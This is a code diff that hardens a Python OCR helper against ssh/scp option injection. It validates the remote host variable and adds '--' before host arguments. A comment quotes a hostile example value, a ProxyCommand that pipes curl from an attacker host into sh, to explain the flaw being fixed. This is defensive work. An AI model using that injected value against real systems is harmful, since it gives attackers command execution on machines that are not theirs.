@@ -4,8 +4,10 @@
 # Edit the canonical file and run `python -m _common.sync`; a test fails if a
 # vendored copy drifts.
 import os
+import re
 import shlex
 import subprocess
+import sys
 import tempfile
 import uuid
 
@@ -18,6 +20,20 @@ MIN_NARRATIVE = 600
 SCANNED_MAX = 500
 
 
+# OCR_REMOTE reaches ssh/scp as the destination argument. `lang` was quoted;
+# the host was not, and ssh treats a leading "-" as an OPTION, not a hostname:
+# OCR_REMOTE="-oProxyCommand=curl attacker|sh" is command execution on the
+# ingest box. It is an operator-set variable rather than scraped data, but it
+# is read from the process environment on a machine that also runs unattended
+# timers, and validating it costs one regex.
+_HOST_RE = re.compile(r"^(?:[A-Za-z0-9_.-]+@)?[A-Za-z0-9.-]+$")
+
+
+def _valid_ocr_host(host):
+    """A plain [user@]host, with no leading dash and no shell metacharacters."""
+    return bool(host) and not host.startswith("-") and bool(_HOST_RE.match(host))
+
+
 def _ocr_remote(pdf_path, lang, host):
     """OCR a scanned PDF on a remote (more powerful) host via ssh.
 
@@ -27,10 +43,16 @@ def _ocr_remote(pdf_path, lang, host):
     Returns "" on any failure. Enabled by env OCR_REMOTE=<host> (e.g.
     user@ocr-host.example) — keeps heavy OCR off a small ingest machine.
     """
+    if not _valid_ocr_host(host):
+        print("[ocr] refusing OCR_REMOTE=%r — expected [user@]host" % (host,),
+              file=sys.stderr)
+        return ""
     remote = "/tmp/ocr-%s.pdf" % uuid.uuid4().hex
     try:
         cp = subprocess.run(
-            ["scp", "-q", str(pdf_path), "%s:%s" % (host, remote)],
+            # "--" ends option parsing, so even a host that slipped the check
+            # above cannot become an ssh/scp flag.
+            ["scp", "-q", "--", str(pdf_path), "%s:%s" % (host, remote)],
             capture_output=True, timeout=180,
         )
         if cp.returncode != 0:
@@ -41,11 +63,11 @@ def _ocr_remote(pdf_path, lang, host):
             '--sidecar "$f" --output-type none %s - >/dev/null 2>&1; '
             'cat "$f"; rm -f "$f" %s'
         ) % (shlex.quote(lang), shlex.quote(remote), shlex.quote(remote))
-        run = subprocess.run(["ssh", host, cmd], capture_output=True, timeout=900)
+        run = subprocess.run(["ssh", "--", host, cmd], capture_output=True, timeout=900)
         return run.stdout.decode("utf-8", "replace").strip()
     except (FileNotFoundError, subprocess.TimeoutExpired):
         try:
-            subprocess.run(["ssh", host, "rm -f %s" % shlex.quote(remote)],
+            subprocess.run(["ssh", "--", host, "rm -f %s" % shlex.quote(remote)],
                            capture_output=True, timeout=30)
         except Exception:
             pass
